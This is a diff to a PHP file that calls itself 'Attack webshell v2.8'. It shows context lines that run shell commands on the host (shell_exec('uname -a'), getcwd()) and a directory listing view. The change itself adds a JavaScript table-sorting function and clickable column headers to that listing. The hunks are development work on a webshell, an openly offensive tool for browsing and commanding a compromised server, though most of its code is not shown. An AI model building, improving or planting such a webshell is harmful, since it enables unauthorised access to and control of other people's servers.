@@ -1,5 +1,5 @@
 <?php
-define('SCRIPT_NAME', 'Attack webshell v2.7');
+define('SCRIPT_NAME', 'Attack webshell v2.8');
 
 $current_directory = getcwd();
 $current_device = shell_exec('uname -a');
@@ -155,15 +155,15 @@ h1, h3 { color: #bb86fc; }
 <?php endif; ?>
 
 <h3>Directory Contents</h3>
-<table>
+<table id="directoryTable">
 <thead>
 <tr>
-<th>Permissions</th>
-<th>Name</th>
-<th>Type</th>
-<th>Size</th>
-<th>Owner</th>
-<th>Last Modified</th>
+<th onclick="sortTable(0)">Permissions</th>
+<th onclick="sortTable(1)">Name</th>
+<th onclick="sortTable(2)">Type</th>
+<th onclick="sortTable(3)">Size</th>
+<th onclick="sortTable(4)">Owner</th>
+<th onclick="sortTable(5)">Last Modified</th>
 </tr>
 </thead>
 <tbody>
@@ -211,5 +211,61 @@ h1, h3 { color: #bb86fc; }
 	color: purple;
 }
 </style>
+<script>
+function sortTable(n) {
+  var table, rows, switching, i, x, y, shouldSwitch, dir, switchcount = 0;
+  table = document.getElementById("directoryTable");
+  switching = true;
+  // Set the sorting direction to ascending:
+  dir = "asc";
+  /* Make a loop that will continue until
+  no switching has been done: */
+  while (switching) {
+    // Start by saying: no switching is done:
+    switching = false;
+    rows = table.rows;
+    /* Loop through all table rows (except the
+    first, which contains table headers): */
+    for (i = 1; i < (rows.length - 1); i++) {
+      // Start by saying there should be no switching:
+      shouldSwitch = false;
+      /* Get the two elements you want to compare,
+      one from current row and one from the next: */
+      x = rows[i].getElementsByTagName("TD")[n];
+      y = rows[i + 1].getElementsByTagName("TD")[n];
+      /* Check if the two rows should switch place,
+      based on the direction, asc or desc: */
+      if (dir == "asc") {
+        if (x.innerHTML.toLowerCase() > y.innerHTML.toLowerCase()) {
+          // If so, mark as a switch and break the loop:
+          shouldSwitch = true;
+          break;
+        }
+      } else if (dir == "desc") {
+        if (x.innerHTML.toLowerCase() < y.innerHTML.toLowerCase()) {
+          // If so, mark as a switch and break the loop:
+          shouldSwitch = true;
+          break;
+        }
+      }
+    }
+    if (shouldSwitch) {
+      /* If a switch has been marked, make the switch
+      and mark that a switch has been done: */
+      rows[i].parentNode.insertBefore(rows[i + 1], rows[i]);
+      switching = true;
+      // Each time a switch is done, increase this count by 1:
+      switchcount ++;
+    } else {
+      /* If no switching has been done AND the direction is "asc",
+      set the direction to "desc" and run the while loop again. */
+      if (switchcount == 0 && dir == "asc") {
+        dir = "desc";
+        switching = true;
+      }
+    }
+  }
+}
+</script>
 </body>
 </html>
